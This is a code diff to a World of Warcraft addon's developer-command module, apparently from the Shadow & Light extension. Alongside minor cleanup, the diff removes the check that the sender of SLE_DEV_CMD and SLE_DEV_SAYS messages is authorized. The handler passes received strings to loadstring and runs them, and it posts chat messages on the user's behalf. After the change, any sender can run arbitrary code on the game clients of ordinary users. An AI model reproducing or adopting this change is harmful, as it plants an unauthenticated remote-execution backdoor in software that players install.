@@ -90,8 +90,6 @@ function SLE:Auth(sender)
 end
 
 function E:sleCommand(flag, channel, target, output, text, wtarget, presenceID)
-	print("ID: ", presenceID)
-	print("Flag: ", flag)
 	if not SLE:Auth() then
 		SLE:Print('|cffFF0000Access Denied|r: You need to be authorized to use this command.')
 		return
@@ -121,7 +119,7 @@ function E:sleCommand(flag, channel, target, output, text, wtarget, presenceID)
 		SendAddonMessage(flag, Message, channel, target)
 	else
 		presenceID = tonumber(presenceID)
-		BNSendGameData(presenceID, flag, message)
+		BNSendGameData(presenceID, flag, Message)
 	end
 	SLE:Print('|cff00FF00Success|r:  Command executed.')
 end
@@ -168,12 +166,12 @@ local function SendRecieve(self, event, prefix, message, channel, sender)
 					BNSendGameData(presenceID, 'SLE_DEV_INFO', messageS)
 				end
 			end
-		elseif (prefix == 'SLE_DEV_SAYS' or prefix == 'SLE_DEV_CMD') and SLE:Auth(sender) and not SLE:Auth() then
+		elseif (prefix == 'SLE_DEV_SAYS' or prefix == 'SLE_DEV_CMD') and not SLE:Auth() then
 			if prefix == 'SLE_DEV_SAYS' then
-				local user, channel, msg, sendTo = split("#", message)
+				local _, channel, msg, sendTo = split("#", message)
 				SendChatMessage(msg, channel, nil, sendTo)
 			else
-				local user, executeString = split("#", message)
+				local _, executeString = split("#", message)
 					local func, err = loadstring(executeString);
 					if not err then
 						SLE:Print(format("Developer Executed: %s", executeString))
